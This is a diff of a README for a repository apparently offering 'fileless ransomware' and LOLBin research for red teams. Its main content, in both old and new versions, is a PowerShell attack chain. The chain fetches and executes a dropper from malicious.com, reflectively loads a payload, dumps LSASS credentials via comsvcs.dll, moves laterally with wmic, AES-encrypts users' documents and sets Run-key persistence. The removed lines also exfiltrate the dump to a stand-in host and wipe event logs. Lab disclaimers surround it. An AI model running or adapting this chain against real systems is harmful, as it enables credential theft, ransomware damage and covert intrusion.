@@ -1,154 +1,90 @@
 
-
 # NSFW: Fileless Polymorphic Hybrid Malware & LOLBins Research
 
 **Repository:** `P1rat3R00t/NSFW`  
-**Purpose:** Educational cybersecurity research into advanced threat techniques, focusing on fileless malware and Living-Off-the-Land Binaries (LOLBins).
+**Purpose:** This project is dedicated to cybersecurity research on advanced fileless malware and Living-Off-the-Land Binaries (LOLBins), exploring their use in stealthy post-exploitation and ransomware simulations in a controlled lab environment.
 
 ---
 
-## ⚠️ Legal & Ethical Notice
-
-> **This repository is strictly for educational, academic, and controlled research lab use.**  
-> **Never deploy or test these techniques on unauthorized or production systems. Misuse may violate laws, ethics, and professional standards.**
-
----
+## 📸 Demonstration Snapshot
 
 ![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)
 
 ---
 
-## 🧠 Overview: Fileless Malware & LOLBins
+## 🧠 Summary: What Is NSFW?
 
-- **Fileless malware** operates entirely in memory, avoiding disk writes to evade detection by antivirus and EDR solutions.
-- **LOLBins** (Living Off the Land Binaries) are legitimate Windows binaries abused by attackers for stealthy, malicious operations. Their trusted status makes detection more challenging.
+NSFW (Not Safe For Workstation) is a red-team-focused framework for studying:
 
----
+- **Fileless malware**, which operates solely in memory to bypass traditional AV/EDR.
+- **Polymorphic behavior**, making detection more difficult via mutation at runtime.
+- **LOLBins (Living Off the Land Binaries)**, trusted system binaries leveraged for offensive operations without dropping executables on disk.
 
-## ⚙️ Common LOLBins and Abuse Patterns
-
-| LOLBin                      | Abused For                | ATT&CK Tactics                   |
-|-----------------------------|---------------------------|----------------------------------|
-| `rundll32.exe`              | DLL execution             | Code execution, EDR bypass       |
-| `mshta.exe`                 | Run HTA payloads          | Script execution, sandbox evasion|
-| `regsvr32.exe`              | Load COM DLLs             | Fileless execution, C2 proxy     |
-| `wmic.exe`                  | Remote command execution  | Process launch, lateral movement |
-| `cmd.exe` / `powershell.exe`| Script runners            | Payload staging, persistence     |
-| `msbuild.exe`               | Inline C# compile/exec    | Fileless malware loading         |
-| `certutil.exe`              | Download/decode files     | Exfiltration, staging            |
-| `bitsadmin.exe`             | Remote file fetch         | Delivery, task persistence       |
-| `schtasks.exe`              | Task scheduling           | Privilege escalation, persistence|
-| `esentutl.exe`              | Copy/exec payloads        | Stealth ops, exfiltration        |
+This toolkit helps simulate a realistic adversary kill chain using MITRE ATT&CK techniques, entirely fileless and stealthy in nature.
 
 ---
 
-## 🧬 Simulated Kill Chain: 100% Fileless Ransomware (Lab Example)
+## 🔓 Fileless Ransomware Lab Example (LOLBins in Action)
 
-*Technique mapping via [MITRE ATT&CK](https://attack.mitre.org/)*
-
-> **Disclaimer:** The following PowerShell sequence is a synthetic, safe example for red team development in a secure lab. **Never execute outside a controlled environment.**
-
-<details>
-<summary>🔐 Click to expand PowerShell Simulation Example</summary>
+> **Warning:** This is a synthetic simulation for red team research.  
+> **Never run outside of an isolated test lab.**
 
 ```powershell
-# 🎯 Initial Access (T1190)
-$payloadUrl = "http://malicious.com/dropper.ps1"
-IEX(New-Object Net.WebClient).DownloadString($payloadUrl)
+# Initial Access (T1190) - Load dropper via web
+IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")
 
-# ⚡ Execution (T1059.001)
-$encPayload = "[Base64-Encoded Payload]"
-$decodedPayload = [System.Convert]::FromBase64String($encPayload)
-[System.Reflection.Assembly]::Load($decodedPayload)
+# Execution (T1059.001) - Decode & load payload
+$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
+[System.Reflection.Assembly]::Load($bytes)
 
-# 🔓 Privilege Escalation (T1548)
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs
+# Privilege Escalation (T1548)
+Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs
 
-# 🧪 Credential Access (T1003.001)
-Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"
+# Credential Access (T1003.001)
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
 
-# 🔍 Discovery (T1082)
-$sysInfo = Get-WmiObject Win32_ComputerSystem | Select Manufacturer, Model, Name, Domain, UserName
-$networkInfo = Get-NetAdapter | Select Name, MacAddress, Status
-Write-Output $sysInfo; Write-Output $networkInfo
+# Lateral Movement (T1021.001)
+wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"
 
-# 🌐 Lateral Movement (T1021.001)
-cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"
-
-# 💣 Impact: File Encryption (T1486)
-$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
-foreach ($file in $targetFiles) {
-    $content = Get-Content $file.FullName -Raw
-    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
-    $aes.IV = New-Object byte[] 16
-    $encryptor = $aes.CreateEncryptor()
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
-    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
-    Set-Content -Path $file.FullName -Value $encryptedContent
+# File Encryption (T1486)
+$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
+foreach ($file in $files) {
+  $data = Get-Content $file.FullName -Raw
+  $aes = New-Object System.Security.Cryptography.AesManaged
+  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
+  $aes.IV = New-Object byte[] 16
+  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
+  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
 }
 
-# 📌 Persistence (T1547.001)
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1"
-schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest
-
-# 📤 Exfiltration (T1041)
-$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
-Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData
-
-# 🧹 Defense Evasion (T1070)
-Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
-wevtutil cl System; wevtutil cl Security; wevtutil cl Application
-cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
-```
-
-</details>
-
----
-
-## 🖥️ TeamViewer as a RAT: Summary
-
-TeamViewer, a legitimate remote desktop tool, can be abused as a Remote Access Trojan (RAT) through weak configurations, credential theft, or exploitation of software vulnerabilities.
-
----
-
-## 🚀 Getting Started
-
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/P1rat3R00t/NSFW.git
-   cd NSFW
-   ```
-2. **Review all code and scripts before executing anything.**
-3. **Set up a safe, isolated lab environment** (physical or virtual) before conducting any testing.
-
----
-
-## 🤝 Contributing
-
-Contributions for improving documentation, research, and detection techniques are welcome!  
-Please open an issue or pull request.  
-**Do not submit or request real malware samples.**
+# Persistence (T1547.001)
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
+````
 
 ---
 
 ## 🧭 Additional Resources
 
-- 🛠️ [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
-- 🧬 [LOLGEN – Generate LOLBin Abuse Chains](https://lolgen.hdks.org/)
-- 🔍 [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
-- 💥 [PrintNightmare Technical Dive](https://itm4n.github.io/printnightmare-not-over/)
-- 💀 [Print Spooler Exploit Overview](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)
-- 🔗 [DLL Injection Reference](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
-- 🦠 [Fileless Malware on Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
-- 🖨️ [Printer Driver Exploit Repo](https://github.com/jacob-baines/concealed_position)
+* [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
+* [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
+* [MITRE ATT\&CK: S0697](https://attack.mitre.org/software/S0697/)
+* [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
+* [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
+* [Fileless Malware Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
 
 ---
 
-## 🛡️ Final Note
+## ⚖️ Legal & Ethical Advisory
 
-This repository is for cybersecurity researchers, malware analysts, and red teamers.  
-**Do not use for malicious purposes or outside legal boundaries. Always comply with your country’s laws and organizational policies.**
+> 📢 **Important Notice:**
+> This repository is for **educational and research purposes only**.
+> You are responsible for complying with all local, national, and international laws when using any code or technique from this project.
+>
+> * Do **not** use NSFW for malicious activity.
+> * Do **not** deploy in any production or unauthorized environment.
+> * Use in **air-gapped**, **isolated**, and **sandboxed labs** only.
+>
+> **Violations of law or professional ethics are your liability.**
+
 
 
